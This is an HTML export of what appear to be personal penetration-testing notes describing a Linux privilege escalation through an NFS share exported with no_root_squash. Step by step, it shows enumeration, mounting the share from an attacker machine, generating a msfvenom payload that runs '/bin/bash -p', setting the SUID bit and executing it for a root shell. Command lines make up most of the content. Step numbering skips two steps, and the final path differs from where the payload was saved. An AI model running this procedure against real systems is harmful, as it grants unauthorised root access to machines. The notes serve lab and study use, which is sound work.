<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Exploit of NFS root squashing</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Exploit of NFS root squashing</h1><br/><br /><strong><h3>Privilege Escalation</h3></strong><br />0. Use Linux Smart Enumeration Tool<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;./lse.sh&nbsp;-l&nbsp;2&nbsp;-i&nbsp;|&nbsp;more</div></div><br />    To search in the result you can type &quot;/NFS&quot;<br />    <a href=""><img src="images/1316-1.png" alt="images/1316-1.png" /></a><br />1. Manually: Check the contents of /etc/exports for shares with the <strong>no_root_squash</strong> option:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;cat&nbsp;/etc/exports</div></div><br />    <a href=""><img src="images/1316-2.png" alt="images/1316-2.png" /></a><br />     <span style="color:#ff8700;">no_root_squash</span> → option means that we can write file to it as the root user over NFS (from another machine). We can mount this folder!<br />4. From the Attacker machine confirm that the NFS share is available for remote mounting:<br />    <div class="codebox"><div class="codebox">attacker@kali:/#&nbsp;showmount&nbsp;-e&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>targetIp<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />    <a href=""><img src="images/1316-3.png" alt="images/1316-3.png" /></a><br />    yes! confirmed<br />5. Create a mount point on your local machine and mount the /tmp NFS share:<br />    <div class="codebox"><div class="codebox">attacker@kali:/#&nbsp;mkdir&nbsp;/tmp/nfs<br />attacker@kali:/#&nbsp;mount&nbsp;-t&nbsp;nfs&nbsp;-o&nbsp;rw,vers=2,nolock&nbsp;192.168.1.25:[remoteDirectory]&nbsp;[localDirectory]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#now&nbsp;attacker&nbsp;and&nbsp;target&nbsp;are&nbsp;sharing&nbsp;the&nbsp;folder</div></div><br />    mount options:<br />   ◇ -o, --options &lt;list&gt; → comma-separated list of mount options<br />      ▪ -w, --rw, --read-write → mount the filesystem read-write (default)<br />      ▪ vers=&lt;number&gt; → select the nfs version, we should specify to use version 2 because if it doesn&#39;t have any authentication or authorization.<br />      ▪ nolock → disables file locking. This setting is occasionally required when connecting to older NFS servers.<br />   ◇ -t, --types &lt;list&gt; → limit the set of filesystem types<br />        <a href=""><img src="images/1316-4.png" alt="images/1316-4.png" /></a><br />6. check if the mount command is been successfull<br />    <div class="codebox"><div class="codebox">attacker@kali:/#&nbsp;mount</div></div><br />    <a href=""><img src="images/1316-5.png" alt="images/1316-5.png" /></a><br />7. Using your local Attacker machine, generate a payload and save it to the mounted share:<br />    <div class="codebox"><div class="codebox">attacker@kali:/#&nbsp;msfvenom&nbsp;-p&nbsp;linux/x86/exec&nbsp;CMD=&quot;/bin/bash&nbsp;-p&quot;&nbsp;-f&nbsp;elf&nbsp;-o&nbsp;/tmp/nfs/shell.elf<br />attacker@kali:/#&nbsp;ls</div></div><br />    <a href=""><img src="images/1316-6.png" alt="images/1316-6.png" /></a><br />    <a href=""><img src="images/1316-7.png" alt="images/1316-7.png" /></a>    <br />8. Make sure the file has the SUID bit set, and is executable by everyone:<br />    We can do it from the attacker or from the target machine.<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;chmod&nbsp;+xs&nbsp;/tmp/nfs/shell.elf</div></div><br />    <a href=""><img src="images/1316-8.png" alt="images/1316-8.png" /></a><br />    As we can see the file shell.elf is:<br />   ◇  owned by root<br />   ◇  it is executable by all users<br />   ◇  has the SUID bit set<br />9. On the target machine, execute the file to get a root shell:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;/tmp/shell.elf</div></div><br />    <a href=""><img src="images/1316-9.png" alt="images/1316-9.png" /></a></div>
</body>
</html>
